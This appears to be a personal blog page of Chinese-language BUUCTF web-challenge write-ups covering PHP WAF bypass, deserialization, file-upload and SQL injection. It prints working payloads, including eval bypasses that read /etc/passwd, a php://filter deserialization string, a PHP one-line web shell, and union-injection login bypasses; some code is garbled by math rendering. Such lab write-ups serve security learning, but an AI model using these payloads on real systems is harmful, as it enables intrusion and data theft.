@@ -1,0 +1,705 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="buuctf，无字符rce" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/04/28/3-txt/">
+
+
+
+  <title>
+buuctf4月27日 - 刷题笔记 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">buuctf4月27日
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-04-28 22:48:23">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-04-28T22:48:23+08:00">2024-04-28</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?601520"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?150488"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?240880"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?887136"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?705434"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?303848"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/04/28/3-txt/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="roarctf-2019easy-calc"><a class="anchor" href="#roarctf-2019easy-calc">#</a> [RoarCTF 2019]Easy Calc</h2>
+<h3 id="在这里插入图片描述"><a class="anchor" href="#在这里插入图片描述">#</a> <img data-src="https://img-blog.csdnimg.cn/direct/8d7e93faf78343328ec17a90191c6c8b.png#pic_center" alt="在这里插入图片描述" /></h3>
+<p>页面发现什么也没有 F12 发现有 calc.php 这个文件，进去发现有源码</p>
+<p>&lt;?php<br />
+error_reporting(0);<br />
+if(!isset($_GET['num'])){<br />
+show_source(<strong>FILE</strong>);<br />
+}else{<br />
+$str = $_GET['num'];<br />
+blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];     
+	foreach (blacklist as $blackitem) {<br />
+if (preg_match('/' . $blackitem . '/m', str)) {             
+			die("what are you want to do?");         
+		}     
+	}     
+	eval('echo '.str.';');<br />
+}<br />
+?&gt;<br />
+ 写 num=system ('ls'); 发现不允许，首页面有一个提示是有 waf 保护，</p>
+<p>可能是不能写参数</p>
+<h3 id="知识点1空格绕过-waf"><a class="anchor" href="#知识点1空格绕过-waf">#</a> 知识点 1：空格绕过 waf</h3>
+<p>在 num 参数前加上一个空格，即：<span class="exturl" data-url="aHR0cDovL25vZGU0LmJ1dW9qLmNuOjI5NzgwL2NhbGMucGhw">node4.buuoj.cn:29780/calc.php</span>? num=system('ls');</p>
+<p>返回结果：</p>
+<p>这样服务器会认为传入的参数是 空格 num ，而不是 num 。这里用到这种绕过方式是因为假定服务器只对 num 参数做检测，而对于其他参数不做检测。</p>
+<p>当 空格 num 参数传入到后端，被 PHP 代码处理时，会被去除多余空格及特殊字符：如空格、制表符、回车换行符以及某些特殊字符等。这样一来仍然是 num 参数了。</p>
+<h4 id="payloadcalcphp-numvar_dumpscandircurrentlocaleconv"><a class="anchor" href="#payloadcalcphp-numvar_dumpscandircurrentlocaleconv">#</a> payload:calc.php? num=var_dump(scandir(current(localeconv())));</h4>
+<p>查看当前目录下的文件<br />
+ localeconv () 函数返回当前设置的地区的格式化信息，包括货币符号、小数点符号等。它返回一个数组，其中包含了与当前地区相关的格式化参数，该函数返回的第一个元素的值通常是小数点 “.” 。<br />
+current () 函数用于获取数组中的当前元素的值。在这里，它用于获取 localeconv () 函数返回的数组的第一个元素的值，即一个小数点。<br />
+scandir () 函数用于获取指定目录中的文件和文件夹列表。它接受一个路径作为参数，并返回一个包含指定目录中所有文件和文件夹的数组。scandir (&quot;.&quot;) 表示获取当前目录下的文件列表。<br />
+最后使用 var_dump () 函数将该列表输出到页面上。</p>
+<p>但其实这里可以更简单：</p>
+<h4 id="calcphp-numvar_dumpscandirchr46"><a class="anchor" href="#calcphp-numvar_dumpscandirchr46">#</a> calc.php? num=var_dump(scandir(chr(46)));</h4>
+<p>46 是 “.” 的 ASCII 码值，返回结果：</p>
+<p>因为可以有参数嘛。用 chr () 函数将数字变为字符。</p>
+<h4 id="同理查看根目录下的文件calcphp-numvar_dumpscandirchr47"><a class="anchor" href="#同理查看根目录下的文件calcphp-numvar_dumpscandirchr47">#</a> 同理查看根目录下的文件：calc.php? num=var_dump (scandir (chr (47)));</h4>
+<p>47 是 “/” 的 ASCII 码值</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/50e93170372c4fbf9e09ad41d6f5909d.png#pic_center" alt="在这里插入图片描述" /></p>
+<p>找到 /f1aag 这个文件</p>
+<p>查看 /f1agg 文件</p>
+<h4 id="numfile_get_contentschr47chr102chr49chr97chr103chr103"><a class="anchor" href="#numfile_get_contentschr47chr102chr49chr97chr103chr103">#</a> num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</h4>
+<h3 id="知识点2file_get_contents-函数"><a class="anchor" href="#知识点2file_get_contents-函数">#</a> 知识点 2.file_get_contents () 函数</h3>
+<p>把整个文件读入一个字符串中。</p>
+<p>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</p>
+<p>分别是 ‘/’ ‘f’ ‘1’ ‘a’ ‘g’ ‘g’ 的 ASCII 值转字符，‘.’ 用作字符串连接。每一个 chr () 函数返回的结果由于是字符，所以自带了一对引号，不需要额外再加。</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/7aacafeccdf94541a6b70abbb639c728.png#pic_center" alt="在这里插入图片描述" /></p>
+<h3 id="知识点3url溢出"><a class="anchor" href="#知识点3url溢出">#</a> 知识点 3.url 溢出</h3>
+<p>? num=1;eval(end(pos(get_defined_vars())))&amp;nss=phpinfo();&amp;</p>
+<p>get_defined_vars ()：返回由所有已定义变量所组成的数组，会返回 _GET , _POST , _COOKIE , _FILES 全局变量的值，返回数组顺序为 get-&gt;post-&gt;cookie-&gt;files 。</p>
+<p>current ()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回 $_GET 变量的数组值。</p>
+<p>end () : 将内部指针指向数组中的最后一个元素，并输出。即新加入的参数 nss 。</p>
+<p>最后由 eval () 函数执行，使得 get 方式的参数 nss 生效。</p>
+<p>这样的话就可以再利用 nss 传参了，由于代码只对 num 参数的值做了过滤，因此 nss 参数理论上可以造成任意代码执行。</p>
+<p>这样可以看到 phpinfo，找到 disable_function 函数</p>
+<h4 id="查看-etcpasswd-文件"><a class="anchor" href="#查看-etcpasswd-文件">#</a> 查看 /etc/passwd 文件</h4>
+<pre><code>? num=1;eval(end(pos(get_defined_vars())))&amp;nss=include(&quot;/etc/passwd&quot;);
+</code></pre>
+<p>输出结果：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/3e1382cdd0e14e2ab9a8582e68920b4f.png#pic_center" alt="在这里插入图片描述" /></p>
+<h3 id="知识点4http请求走私"><a class="anchor" href="#知识点4http请求走私">#</a> 知识点 4.http 请求走私</h3>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/da31f71647244b56aad12e09678180b5.png#pic_center" alt="在这里插入图片描述" /></p>
+<p>大致原理就是使用了两个 Content-Length 头，使得前端无法识别，直接将整个包完全发给了后端。但这样还是要接受后端的黑名单过滤，所以 num 传参还是不能为所欲为。</p>
+<h2 id="hctf-2018admin-1"><a class="anchor" href="#hctf-2018admin-1">#</a> [HCTF 2018]admin 1</h2>
+<p><strong>第一种解法：密码爆破 - 尝试弱口令</strong></p>
+<p>[BUUCTF-<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2OTE4Mjc5L2FydGljbGUvZGV0YWlscy8xMjEyOTQ5MTU=">HCTF 2018] admin1_[hctf 2018] admin 1-CSDN 博客</span></p>
+<p>三种方法不太理解。</p>
+<h2 id="zjctf-2019nizhuansiwei"><a class="anchor" href="#zjctf-2019nizhuansiwei">#</a> [ZJCTF 2019]NiZhuanSiWei</h2>
+<h3 id="image-20240426180112007"><a class="anchor" href="#image-20240426180112007">#</a> <img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426180112007.png" alt="image-20240426180112007" /></h3>
+<h4 id="1先要把welcome-to-the-zjctf从text中读出来"><a class="anchor" href="#1先要把welcome-to-the-zjctf从text中读出来">#</a> 1. 先要把 “welcome to the zjctf” 从 $text 中读出来</h4>
+<p>?text=data://text/plain,welcome to the zjctf</p>
+<p>2.$file 不能是含有 flag, 有一个文件 include () 函数可以先写 php 伪协议读一下，（因为 password 还不知道要干嘛，password 有 unserialize (), 可以初步判断是反序列化，直接输出，可以看出是__tostring 函数这个魔术方法（将这个对象当成字符串输出））</p>
+<p>3.&lt;?php</p>
+<p>class Flag{  <a target="_blank" rel="noopener" href="//flag.php">//flag.php</a><br />
+public file;  
+    public function __tostring(){  
+        if(isset(this-&gt;file)){<br />
+echo file_get_contents($this-&gt;file);<br />
+echo &quot;&lt;br&gt;&quot;;<br />
+return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);<br />
+}<br />
+}<br />
+}<br />
+?&gt; useless.php 里的文件内容，可以发现是一个对象，可以用 password=<em>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</em></p>
+<p>绕过</p>
+<p>最后的 payload:</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span></pre></td></tr></table></figure><h2 id="mrctf2020ez_bypass"><a class="anchor" href="#mrctf2020ez_bypass">#</a> [MRCTF2020]Ez_bypass</h2>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426182327414.png" alt="image-20240426182327414" /></p>
+<p>I put something in F12 for you<br />
+include 'flag.php';<br />
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>M</mi><mi>R</mi><mi>C</mi><mi>T</mi><mi>F</mi><msup><mrow><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">;</mo><mi>i</mi><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">flag=&#x27;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#x27;;
+if(isset(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span>_GET['gg'])&amp;&amp;isset($_GET['id'])) {<br />
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">id=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>_GET['id'];<br />
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>g</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">gg=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>_GET['gg'];<br />
+if (md5(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">id) === md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>gg) &amp;&amp; $id !== gg) {
+        echo 'You got the first step';
+        if(isset(_POST['passwd'])) {<br />
+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">passwd=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>_POST['passwd'];<br />
+if (!is_numeric(passwd))
+            {
+                 if(passwd==1234567)<br />
+{<br />
+echo 'Good Job!';<br />
+highlight_file('flag.php');<br />
+die('By Retr_0');<br />
+}<br />
+else<br />
+{<br />
+echo &quot;can you think twice??&quot;;<br />
+}<br />
+}<br />
+else{<br />
+echo 'You can not get it !';<br />
+}</p>
+<pre><code>    &#125;
+    else&#123;
+        die('only one way to get the flag');
+    &#125;
+</code></pre>
+<p>}<br />
+else {<br />
+echo &quot;You are not a real hacker!&quot;;<br />
+}<br />
+}<br />
+else{<br />
+die('Please input first');<br />
+}<br />
+}Please input first<br />
+ 三个参数：gg&amp;&amp;id&amp;&amp;passwd, 第一二个是数组绕过（因为是强相等）</p>
+<p>passwd 是弱比较（1234567qhwjhiquwf）获得 flag</p>
+<h2 id="网鼎杯-2020-青龙组areuserialz"><a class="anchor" href="#网鼎杯-2020-青龙组areuserialz">#</a> [网鼎杯 2020 青龙组] AreUSerialz</h2>
+<p>在反序列化的过程中，调用__destruct 析构方法</p>
+<pre><code>function  __destruct() &#123;  
+if($this-&gt;op === &quot;2&quot;)   
+$this-&gt;op = &quot;1&quot;;  
+$this-&gt;content = &quot;&quot;;
+$this-&gt;process();&#125;
+</code></pre>
+<pre><code>public  function` `process() &#123;
+  if($this-&gt;op == &quot;1&quot;) &#123;
+    $this-&gt;write();
+  &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+    $res= $this-&gt;read();
+    $this-&gt;output($res);
+  &#125; else&#123;
+    $this-&gt;output(&quot;Bad Hacker!&quot;);
+  &#125;
+&#125;
+</code></pre>
+<p>查看代码可以看出来，GET 方式传入序列化的 str 字符串，str 字符串中每一个字符的 ASCII 范围在 32 到 125 之间，然后对其反序列化。</p>
+<p>如果 op===&quot;2&quot;，将其赋为 &quot;1&quot;，同时 content 赋为空，进入 process 函数，需要注意到的地方是，这里 op 与 &quot;2&quot; 比较的时候是强类型比较</p>
+<p>进入 process 函数后，如果 op==&quot;1&quot;，则进入 write 函数，若 op==&quot;2&quot;，则进入 read 函数，否则输出报错，可以看出来这里 op 与字符串的比较变成了弱类型比较 ==。</p>
+<p>所以我们只要令 op=2, 这里的 2 是整数 int。当 op=2 时，op===&quot;2&quot; 为 false，op==&quot;2&quot; 为 true，接着进入 read 函数</p>
+<p>整个利用思路就很明显了，还有一个需要注意的地方是，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>p</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">op,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mpunct">,</span></span></span></span>filename,$content 三个变量权限都是 protected，而</p>
+<h4 id="protected权限的变量在序列化的时会有0000字符"><a class="anchor" href="#protected权限的变量在序列化的时会有0000字符">#</a> protected 权限的变量在序列化的时会有 %00*%00 字符，</h4>
+<p>%00 字符的 ASCII 码为 0，就无法通过上面的 is_valid 函数校验。</p>
+<p><img data-src="https://img2020.cnblogs.com/blog/1828215/202005/1828215-20200512095733036-1748012487.png" alt="img" /></p>
+<p>在这里有几种绕过的方式，简单的一种是：php7.1 + 版本对属性类型不敏感，本地序列化的时候将属性改为 public 进行绕过即可</p>
+<p s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php:filterread="convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;">paylaod:?str=O:11:%22FileHandler%22:3:</p>
+<p>比赛的时候还有相对路径和绝对路径的问题，需要拿到绝对路径才能读取 flag</p>
+<p>可以先尝试读取 /etc/passwd 检验自己的 payload 是否正确，然后再读取服务器上的配置文件，猜出 flag.php 所在的绝对路径，再将其读取。</p>
+<pre><code>http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:60:%22php://filter/read=convert.base64-encode/resource=/etc/passwd%22;s:7:%22content%22;N;&#125;
+</code></pre>
+<p>下面这个 payload 是比赛的时候用的，buuoj 上环境路径不一样。</p>
+<pre><code>http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:67:%22php://filter/read=convert.base64-encode/resource=/web/html/flag.php%22;s:7:%22content%22;N;&#125;
+</code></pre>
+<h2 id="gxyctf2019babyupload"><a class="anchor" href="#gxyctf2019babyupload">#</a> [GXYCTF2019]BabyUpload</h2>
+<h3 id="image-20240426201402591"><a class="anchor" href="#image-20240426201402591">#</a> <img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426201402591.png" alt="image-20240426201402591" /></h3>
+<p>1.<img data-src="https://img-blog.csdnimg.cn/2021070719261872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNzAyOTgx,size_16,color_FFFFFF,t_70" alt="" /></p>
+<p>2. 先写一下.htaccess 和 user.ini 两个配置文件，会发现</p>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426202003132.png" alt="image-20240426202003132" /></p>
+<p>所以要改一下，SetHandler application/x-httpd-php 这样写</p>
+<h4 id="3要改content-typeimagejpeg是图片的样式applicationoctet-stream是php样式"><a class="anchor" href="#3要改content-typeimagejpeg是图片的样式applicationoctet-stream是php样式">#</a> 3. 要改 Content-Type:image/jpeg 是图片的样式，application/octet-stream 是 php 样式。</h4>
+<p>4. 过滤 &lt;? 可以用 JS 辅助写一句话木马</p>
+<p>&lt;script language=&quot;php&quot;&gt;@eval($_POST[aaa]);&lt;/script&gt;</p>
+<p>蚁剑连接查看。</p>
+<h2 id="buuctf-gxyctf2019babysqli-1"><a class="anchor" href="#buuctf-gxyctf2019babysqli-1">#</a> BUUCTF [GXYCTF2019]BabySQli 1</h2>
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/6a38d3e45f32eceef1727c3a2b07aea9.png" alt="image.png" /></p>
+<p>burp 抓包：初看应该是 sql 注入</p>
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/87b8cc9d7c33f114c34c155c5bfe169c.png" alt="image.png" /></p>
+<p>找到隐藏信息，双重加密，base32 解码后再 base64 解码，</p>
+<p>得到 select * from user where username = '$name'</p>
+<p>找到注入点，可以知道 $name 是参数，并且就是第一个输入的值</p>
+<p>万能钥匙不能直接进去，换成 0‘ ||TRUE# 不能用（显示密码错误） 换个角度，联合注入 1’‘ unoin select 1,2# 发现报错列数错了加一个 1’‘ unoin select 1,2,3# 显示 wrong user 一个一个试将那个 $name = 数组的那个</p>
+<p>发现是第二个</p>
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/7b865fe304a063e64dceb70d90e59afb.png" alt="image.png" /></p>
+<p>找到</p>
+<p>if($arr[1] == &quot;admin&quot;)</p>
+<p>{ 		if(md5($password) == $arr[2])</p>
+<p echo="" $flag;="">​                  </p>
+<p>​             else{ 			die(&quot;wrong pass!&quot;); 		} 	}</p>
+<p>换种方式猜测<br />
+ username 数据表里面的 3 个字段分别是 flag、name、password。<br />
+猜测只有 password 字段位 NULL<br />
+ 咱们给参数 password 传入的值是 123<br />
+ 那么传进去后，后台就会把 123 进行 md5 值加密并存放到 password 字段当中<br />
+当我们使用查询语句的时候<br />
+我们 pw 参数的值会被 md5 值进行加密<br />
+然后再去与之前存入 password 中的 md5 值进行比较<br />
+如果相同就会输出 flag</p>
+<p>爆 flag：</p>
+<p>这里 pw 参数的值为 123456<br />
+ 可以随便传<br />
+但是要对传入的那个值进行 md5 值加密<br />
+网上可以随便找一个在线 md5 加密平台</p>
+<p>1’union select 1,‘admin’,‘e10adc3949ba59abbe56e057f20f883e’#<br />
+123456<br />
+[GYCTF2020]Blacklist 1</p>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426210530825.png" alt="image-20240426210530825" /></p>
+<p>注入点尝试 1’出错了就是‘</p>
+<p>union select 发现正则匹配 select 被过滤，直接双写看看可以不可以，发现不可以</p>
+<h3 id="知识点handler语法"><a class="anchor" href="#知识点handler语法">#</a> 知识点：Handler 语法</h3>
+<p>handler 语句，一行一行的浏览一个表中的数据</p>
+<p>handler 语句并不具备 select 语句的所有功能。</p>
+<p>mysql 专用的语句，并没有包含到 SQL 标准中。<br />
+HANDLER 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p>
+<p>1、HANDLER tbl_name OPEN</p>
